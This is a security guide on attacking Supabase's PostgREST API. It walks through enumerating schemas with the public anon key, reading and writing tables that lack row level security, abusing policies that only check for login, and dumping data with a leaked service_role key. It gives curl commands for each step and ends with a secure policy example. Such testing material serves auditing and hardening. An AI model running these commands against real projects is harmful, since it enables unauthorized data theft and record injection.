# PostgREST API & Row Level Security (RLS)

When a developer creates a table in Supabase, it is immediately accessible via the PostgREST API. By default, RLS is **disabled** on new tables, meaning if an attacker discovers the public `anon` key, they have full read/write/delete access.

---

## 1. High-Speed API Enumeration

To interact with a Supabase backend, you need two things:
1. **The Project URL:** `https://<PROJECT_REF>.supabase.co`
2. **The `anon` Key:** A public JWT intended to be shipped in the frontend code.

*You can usually find both hardcoded in the client-side JavaScript bundle (e.g., `NEXT_PUBLIC_SUPABASE_URL` and `NEXT_PUBLIC_SUPABASE_ANON_KEY`).*

### Introspecting the OpenAPI Specification
PostgREST automatically generates an OpenAPI spec. You can dump the entire database schema (tables, columns, and foreign keys) by hitting the root endpoint:

```bash
curl -s "https://<PROJECT_REF>.supabase.co/rest/v1/?apikey=<ANON_KEY>" | jq .
2. Testing for Missing RLS (The "Open Table" Exploit)
If a developer forgot to enable RLS, the public anon key is all you need to dump the data.

Unauthenticated Read Test
Attempt to pull all records from a discovered table (e.g., users or profiles):

Bash
curl -s -X GET "https://<PROJECT_REF>.supabase.co/rest/v1/users?select=*" \
  -H "apikey: <ANON_KEY>" \
  -H "Authorization: Bearer <ANON_KEY>"
Vulnerable (200 OK with data): RLS is missing. The table is fully exposed.

Secured (200 OK with []): RLS is active, but you may still be able to bypass it.

Unauthenticated Write Test
Test if you can inject records without authentication:

Bash
curl -s -X POST "https://<PROJECT_REF>.supabase.co/rest/v1/users" \
  -H "apikey: <ANON_KEY>" \
  -H "Authorization: Bearer <ANON_KEY>" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '{"email": "attacker@example.com", "role": "admin"}'
3. Bypassing Flawed RLS Policies
If RLS is enabled, developers often write flawed policies.

The "Authenticated" Fallacy
Developers frequently check if a user is logged in, but fail to check if they own the data they are requesting.

Vulnerable PostgreSQL Policy:
CREATE POLICY "Users can view data" ON users FOR SELECT USING (auth.role() = 'authenticated');

The Exploit:
Register a legitimate account in the application to obtain an authenticated JWT. Then, use that JWT in your API requests to dump data belonging to other users.

Bash
curl -s -X GET "https://<PROJECT_REF>.supabase.co/rest/v1/transactions?select=*" \
  -H "apikey: <ANON_KEY>" \
  -H "Authorization: Bearer <YOUR_AUTHENTICATED_JWT>"
4. The service_role Key Compromise
Supabase provides a service_role key designed strictly for backend administrative servers. It bypasses all RLS policies entirely.

If you find a JWT in the source code or an exposed .env file, inspect the payload. If the role is service_role, you have complete database takeover capabilities.

Bash
# Dump any table using the service_role key
curl -s -X GET "https://<PROJECT_REF>.supabase.co/rest/v1/users?select=*" \
  -H "apikey: <ANON_KEY>" \
  -H "Authorization: Bearer <SERVICE_ROLE_KEY>"
5. Hardening & Remediation
To secure Supabase, RLS must enforce strict resource ownership using the auth.uid() function.

Secure Policy Example
This ensures users can only interact with rows where the user_id column matches their authenticated token's UID:

SQL
CREATE POLICY "Users can only see their own data" 
ON users 
FOR SELECT 
USING (auth.uid() = user_id);
